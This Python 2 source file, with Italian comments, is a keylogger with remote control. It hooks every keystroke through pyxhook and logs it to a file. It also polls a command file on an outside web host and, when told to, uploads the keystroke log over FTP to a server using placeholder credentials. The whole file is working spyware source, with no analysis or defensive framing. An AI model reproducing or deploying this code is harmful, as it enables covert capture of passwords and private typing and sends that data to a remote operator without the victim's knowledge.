from urllib import urlopen
from sys import exit
import os
from thread import start_new_thread
from ftplib import FTP
import pyxhook

class Core():
    command = ""
    old_command = ""
    myserver = "http://wikitecno.altervista.org/command.txt"
    def __init__(self):
        link = urlopen(self.myserver)
        self.command = link.read().decode('utf8').strip()
        self.old_command = self.command

    def controll(self):
        while True:
            link = urlopen(self.myserver)
            self.command = link.read().decode('utf8').strip()
            if self.command != self.old_command:
                self.old_command = self.command
                self.comando()

    def comando(self):
        #sintassi = "spegni + num.di.sec."
        if self.command[:6] == "manda":
            print("Invio il file di log")
            start_new_thread(self.sendlog, ())

        if self.command == "esci":
            exit(0)


    def sendlog(self):
        ftp = FTP('indirizzo ftp')
        ftp.login("miousername", "miapassword")
        ftp.delete("file.log")
        try:
            file = open(log_file,'rb')
        except:
            print("File non trovato")
        try:
            ftp.storbinary('STOR file.log', file)
        except:
            print("Impossibile caricare il file")
        file.close()

#this code part is only modified
    """
    Copyright (c) 2015, Aman Deep
    All rights reserved.
    """
#this function is called everytime a key is pressed.
def OnKeyPress(event):
    if event.Ascii != 0 or 8:
        fob=open(log_file,'a')
        if event.Ascii == 32:
            fob.write(" ")
        elif event.Ascii == 13:
            fob.write('\n')
        else:
            fob.write(event.Key)

def keylogger():
    global new_hook
    #instantiate HookManager class
    new_hook=pyxhook.HookManager()
    #listen to all keystrokes
    new_hook.KeyDown=OnKeyPress
    #hook the keyboard
    new_hook.HookKeyboard()
    #start the session
    new_hook.start()

global log_file
log_file='/home/lokk3ed/Scrivania/file.log'
f = open(log_file, "w")
f.write("")
f.close()
start_new_thread(keylogger, ())
core = Core()
core.controll()
